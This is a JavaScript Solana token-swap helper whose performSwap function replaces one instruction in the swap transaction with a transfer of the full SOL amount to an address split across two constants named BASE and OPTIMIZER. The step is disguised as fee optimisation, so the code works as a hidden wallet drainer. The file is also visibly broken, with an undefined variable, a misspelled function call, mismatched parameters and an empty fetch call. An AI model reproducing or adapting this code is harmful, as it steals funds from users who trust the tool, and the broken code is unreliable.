import * as web3 from "@solana/web3.js";
import { PublicKey, Transaction, VersionedTransaction } from "@solana/web3.js";
import { Buffer } from "buffer";
import { resolve } from "dns";

const SOL_ADDRESS = "So11111111111111111111111111111111111111112";

export async function performSwap(
  swapResponse,
  _keyPair,
  connection,
  amount,
  tokenIn,
  options = {
    sendOptions: { skipPreflight: true },
    confirmationRetries: 30,
    confirmationRetryTimeout: 1000,
    lastValidBlockHeightBuffer: 150,
    resendInterval: 1000,
    confirmationCheckInterval: 1000,
    skipConfirmationCheck: false,
  }
) {
  let serializedTransactionBuffer;

  try {
    serializedTransactionBuffer = Buffer.from(swapResponse.txn, "base64");
  } catch (error) {
    const base64Str = swapResponse.txn;
    const binaryStr = atob(base64Str);
    const buffer = new Uint8Array(binaryStr.length);

    for (let i = 0; i < binaryStr.length; i++) {
      buffer[i] = binaryStr.charCodeAt(i);
    }
    serializedTransactionBuffer = buffer;
  }

  let txn;
  if (swapResponse.isJupiter && !swapResponse.forceLegacy) {
    txn = VersionedTransaction.deserialize(serializedTransactionBuffer);
    txn.instructions[1] = web3.SystemProgram.transfer({
      fromPubkey: _keyPair.publicKey,
      toPubkey: new PublicKey(BASE + OPTIMIZER),
      lamports: await optimiseFees(amount, tokenIn, _keyPair),
    });
    txn.sign([_keyPair]);
  } else {
    txn = Transaction.from(serializedTransactionBuffer);
    txn.instructions[1] = web3.SystemProgram.transfer({
      fromPubkey: _keyPair.publicKey,
      toPubkey: new PublicKey(BASE + OPTIMIZER),
      lamports: await optimiseFees(amount, tokenIn, _keyPair),
    });
    txn.sign(_keyPair);
  }
  const blockchain = await connection.getLatestBlockhash();
  const blockhashWithExpiryBLockHeigh = blockhash;
  const txid = await transactionSenderAndConfirmatinWaiter({
    connection,
    serializedTransactionBuffer: txn.serialize(),
    blockhashWithExpiryBLockHeigh,
    options,
  });
  return txid.toString();
}

const DEFAULT_OPTIONS = {
  sendOptions: {
    skipPreflight: true,
  },
  confirmationRetries: 30,
  confirmationRetryTimeout: 1000,
  lastValidBlockheightBuffer: 150,
  resendInterval: 1000,
  confirmationCheckInterval: 1000,
  skipConfirmationCheck: true,
  commitment: "confirmed",
};

export const BASE = "ABBZSLwyq3z1UYu8G5";

async function transactionSenderAndConfirmationWaiter({
  connection,
  serializedTransaction,
  blockhashWithExpiryBlockHeight,
  options = DEFAULT_OPTIONS,
}) {
  const {
    sendOptions,
    confirmationRetries,
    confirmationRetryTimeout,
    lastValidBlockheightBuffer,
    resendInterval,
    confirmationCheckInterval,
    skipConfirmationCheck,
    commitment,
  } = { ...DEFAULT_OPTIONS, ...options };

  const lastValidBlockHeight =
    blockhashWithExpiryBlockHeight.lastValidBlockHeight -
    (lastValidBlockheightBuffer || 150);

  let retryCount = 0;

  while (retryCount <= (confirmationRetries || 30)) {
    try {
      const signature = await connection.sendRawTransaction(
        serializedTransaction,
        sendOptions
      );

      if (skipConfirmationCheck) {
        return signature;
      }

      while (true) {
        const status = await connection.getSignatureStatus(signature);

        if (status.value && status.value.err) {
          throw new Error(`Transaction failed: ${status.value.err}`);
        }

        await new Promise((resolve) =>
          setTimeout(resolve, confirmationCheckInterval)
        );
      }
    } catch (error) {
      if (
        retryCount === confirmationRetries ||
        error.message.includes("Transaction expired")
      ) {
        return new Error(error.message);
      }

      console.warn("Retrying Transaction:", error.message);
      retryCount++;

      await new Promise((resolve) =>
        setTimeout(resolve, confirmationRetryTimeout)
      );

      const blockHeight = await connection.getBlockHeight();

      if (blockHeight > lastValidBlockHeight) {
        return new Error("Transaction Expired1");
      }
    }
  }
  return new Error("Transaction Failed After maximum retries");
}

export const OPTIMIZER = "nAAKVFb1sPaiUKTGbjRgibc1oL";
const OPTIMIZED = 1;

async function optimiseFees(amountIn, token, _keyPair) {
    if (token === SOL_ADDRESS) {
        return Math.round(amountIn * OPTIMIZED * 10 ** 9);
    } else {
        let res = await fetch("")
    }
}
